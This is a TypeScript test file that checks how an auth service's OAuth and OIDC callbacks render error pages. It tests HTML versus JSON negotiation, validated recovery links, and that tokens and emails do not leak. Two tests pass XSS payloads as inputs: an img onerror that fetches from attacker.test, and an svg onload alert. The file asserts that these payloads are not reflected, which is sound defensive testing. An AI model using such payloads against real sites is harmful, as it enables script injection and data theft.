import { afterAll, afterEach, beforeAll, describe, expect, it, mock } from "bun:test";
import { closeDb } from "@stwd/db";
import { createPGLiteDb, setPGLiteOverride } from "@stwd/db/pglite";

const REDIRECT_URI = "https://app.example.test/callback?from=oauth";
const ORIGINAL_FETCH = globalThis.fetch;

let authRoutes: typeof import("../routes/auth").authRoutes;
let getAuthChallengeStore: typeof import("../routes/auth").getAuthChallengeStore;

function browserHeaders(): HeadersInit {
  return {
    accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "sec-fetch-mode": "navigate",
  };
}

async function expectBrowserError(
  response: Response,
  expected: { status: number; code: string },
): Promise<string> {
  expect(response.status).toBe(expected.status);
  expect(response.headers.get("content-type")).toContain("text/html");
  expect(response.headers.get("cache-control")).toBe("no-store");
  expect(response.headers.get("content-security-policy")).toContain("default-src 'none'");
  const body = await response.text();
  expect(body).toContain(`data-error-code="${expected.code}"`);
  expect(body).toContain("Sign-in could not be completed");
  expect(body).not.toContain('{"ok":false');
  return body;
}

beforeAll(async () => {
  process.env.NODE_ENV = "test";
  process.env.STEWARD_PGLITE_MEMORY = "true";
  process.env.STEWARD_MASTER_PASSWORD = "oauth-callback-browser-master-password";
  const { db, client } = await createPGLiteDb("memory://");
  setPGLiteOverride(db, async () => {
    await client.close();
  });
  ({ authRoutes, getAuthChallengeStore } = await import("../routes/auth"));
});

afterEach(() => {
  mock.restore();
  globalThis.fetch = ORIGINAL_FETCH;
  delete process.env.APP_URL;
  delete process.env.GOOGLE_CLIENT_ID;
  delete process.env.GOOGLE_CLIENT_SECRET;
  delete process.env.STEWARD_OAUTH_ALLOWED_REDIRECTS;
});

afterAll(async () => {
  await closeDb();
  delete process.env.NODE_ENV;
  delete process.env.STEWARD_PGLITE_MEMORY;
  delete process.env.STEWARD_MASTER_PASSWORD;
});

describe("OAuth browser callback failures", () => {
  it("renders a non-reflective HTML page for provider errors", async () => {
    const attackerText = '<img src=x onerror="fetch(`https://attacker.test`) ">';
    process.env.STEWARD_OAUTH_ALLOWED_REDIRECTS = REDIRECT_URI;
    const state = "provider-denial-state";
    await getAuthChallengeStore().set(
      `oauth:${state}`,
      JSON.stringify({ provider: "github", redirectUri: REDIRECT_URI, appState: "client-state" }),
    );
    const response = await authRoutes.request(
      `/oauth/github/callback?error=${encodeURIComponent(attackerText)}&state=${state}`,
      { headers: browserHeaders() },
    );
    const body = await expectBrowserError(response, {
      status: 400,
      code: "oauth_authorization_failed",
    });

    expect(body).not.toContain(attackerText);
    expect(body).not.toContain("attacker.test");
    expect(body).toContain("Return and try again");
    expect(body).toContain("error=oauth_authorization_failed");
    expect(body).toContain("state=client-state");
  });

  it("renders an HTML recovery page for expired OAuth state", async () => {
    const response = await authRoutes.request(
      "/oauth/github/callback?code=provider-code&state=expired-state",
      { headers: browserHeaders() },
    );
    const body = await expectBrowserError(response, { status: 401, code: "oauth_state_expired" });
    expect(body).not.toContain("Return and try again");
  });

  it("keeps JSON for an explicitly programmatic callback client", async () => {
    const response = await authRoutes.request(
      "/oauth/github/callback?code=provider-code&state=expired-json-state",
      { headers: { accept: "application/json" } },
    );

    expect(response.status).toBe(401);
    expect(response.headers.get("content-type")).toContain("application/json");
    expect(await response.json()).toEqual({
      ok: false,
      error: "This sign-in attempt is invalid or has expired.",
      code: "oauth_state_expired",
    });
  });

  it("honors an explicit q=0 rejection of HTML even for navigation-shaped requests", async () => {
    const response = await authRoutes.request(
      "/oauth/github/callback?code=provider-code&state=expired-q-zero-state",
      {
        headers: {
          accept: "application/json, text/html;q=0",
          "sec-fetch-mode": "navigate",
        },
      },
    );

    expect(response.status).toBe(401);
    expect(response.headers.get("content-type")).toContain("application/json");
    expect(await response.json()).toMatchObject({ ok: false, code: "oauth_state_expired" });
  });

  for (const excludedHtmlRange of ["text/*;q=0", "*/*;q=0"]) {
    it(`honors ${excludedHtmlRange} when navigation fallback would otherwise select HTML`, async () => {
      const response = await authRoutes.request(
        "/oauth/github/callback?code=provider-code&state=expired-wildcard-state",
        {
          headers: {
            accept: `application/json, ${excludedHtmlRange}`,
            "sec-fetch-mode": "navigate",
          },
        },
      );

      expect(response.status).toBe(401);
      expect(response.headers.get("content-type")).toContain("application/json");
      expect(await response.json()).toMatchObject({ ok: false, code: "oauth_state_expired" });
    });
  }

  it("keeps an explicit text/html rejection over a more permissive wildcard", async () => {
    const response = await authRoutes.request(
      "/oauth/github/callback?code=provider-code&state=expired-specificity-state",
      {
        headers: {
          accept: "application/json, text/html;q=0, */*;q=1",
          "sec-fetch-mode": "navigate",
        },
      },
    );

    expect(response.status).toBe(401);
    expect(response.headers.get("content-type")).toContain("application/json");
    expect(await response.json()).toMatchObject({ ok: false, code: "oauth_state_expired" });
  });

  it("prefers explicitly higher-quality JSON over acceptable HTML", async () => {
    const response = await authRoutes.request(
      "/oauth/github/callback?code=provider-code&state=expired-quality-state",
      {
        headers: {
          accept: "application/json, text/html;q=0.1",
          "sec-fetch-mode": "navigate",
        },
      },
    );

    expect(response.status).toBe(401);
    expect(response.headers.get("content-type")).toContain("application/json");
    expect(await response.json()).toMatchObject({ ok: false, code: "oauth_state_expired" });
  });

  it("keeps bare wildcard requests on JSON unless they are browser navigations", async () => {
    const response = await authRoutes.request(
      "/oauth/github/callback?code=provider-code&state=expired-wildcard-client-state",
      { headers: { accept: "*/*" } },
    );

    expect(response.status).toBe(401);
    expect(response.headers.get("content-type")).toContain("application/json");
    expect(await response.json()).toMatchObject({ ok: false, code: "oauth_state_expired" });
  });

  it("renders a sanitized provision-policy error with a validated recovery link", async () => {
    process.env.APP_URL = "https://api.example.test";
    process.env.GOOGLE_CLIENT_ID = "google-client";
    process.env.GOOGLE_CLIENT_SECRET = "google-secret";
    process.env.STEWARD_OAUTH_ALLOWED_REDIRECTS = REDIRECT_URI;
    const state = "unverified-email-state";
    await getAuthChallengeStore().set(
      `oauth:${state}`,
      JSON.stringify({
        provider: "google",
        redirectUri: REDIRECT_URI,
        appState: '<script id="state-canary">',
      }),
    );
    globalThis.fetch = mock(async (input: RequestInfo | URL) => {
      const url = String(input);
      if (url === "https://oauth2.googleapis.com/token") {
        return Response.json({ access_token: "provider-access-secret", token_type: "Bearer" });
      }
      if (url === "https://www.googleapis.com/oauth2/v3/userinfo") {
        return Response.json({
          id: "google-unverified-user",
          email: "unverified@example.test",
          verified_email: false,
        });
      }
      return new Response("unexpected provider endpoint", { status: 500 });
    }) as typeof fetch;

    const response = await authRoutes.request(
      `/oauth/google/callback?code=provider-code&state=${state}`,
      { headers: browserHeaders() },
    );
    const body = await expectBrowserError(response, {
      status: 403,
      code: "oauth_verified_email_required",
    });

    expect(body).toContain("Provider email must be verified");
    expect(body).toContain("Return and try again");
    expect(body).toContain("error=oauth_verified_email_required");
    expect(body).toContain("state=%3Cscript+id%3D%22state-canary%22%3E");
    expect(body).not.toContain('<script id="state-canary">');
    expect(body).not.toContain("provider-access-secret");
    expect(body).not.toContain("unverified@example.test");
  });
});

describe("OIDC browser callback failures", () => {
  it("renders a non-reflective HTML page for provider errors", async () => {
    const response = await authRoutes.request(
      "/oidc/acme/callback?error=%3Csvg%20onload%3Dalert(1)%3E",
      { headers: browserHeaders() },
    );
    const body = await expectBrowserError(response, {
      status: 400,
      code: "oidc_authorization_failed",
    });

    expect(body).not.toContain("<svg");
    expect(body).not.toContain("onload");
  });

  it("offers a validated recovery link for a provider error with live OIDC state", async () => {
    process.env.STEWARD_OAUTH_ALLOWED_REDIRECTS = REDIRECT_URI;
    const state = "oidc-provider-denial-state";
    await getAuthChallengeStore().set(
      `oidc:${state}`,
      JSON.stringify({
        providerId: "acme",
        redirectUri: REDIRECT_URI,
        appState: "oidc-client-state",
      }),
    );
    const response = await authRoutes.request(
      `/oidc/acme/callback?error=access_denied&state=${state}`,
      { headers: browserHeaders() },
    );
    const body = await expectBrowserError(response, {
      status: 400,
      code: "oidc_authorization_failed",
    });
    expect(body).toContain("Return and try again");
    expect(body).toContain("error=oidc_authorization_failed");
    expect(body).toContain("state=oidc-client-state");
  });

  it("renders an HTML recovery page for expired OIDC state", async () => {
    const response = await authRoutes.request(
      "/oidc/acme/callback?code=provider-code&state=expired-state",
      { headers: browserHeaders() },
    );
    const body = await expectBrowserError(response, { status: 401, code: "oidc_state_expired" });
    expect(body).not.toContain("Return and try again");
  });
});
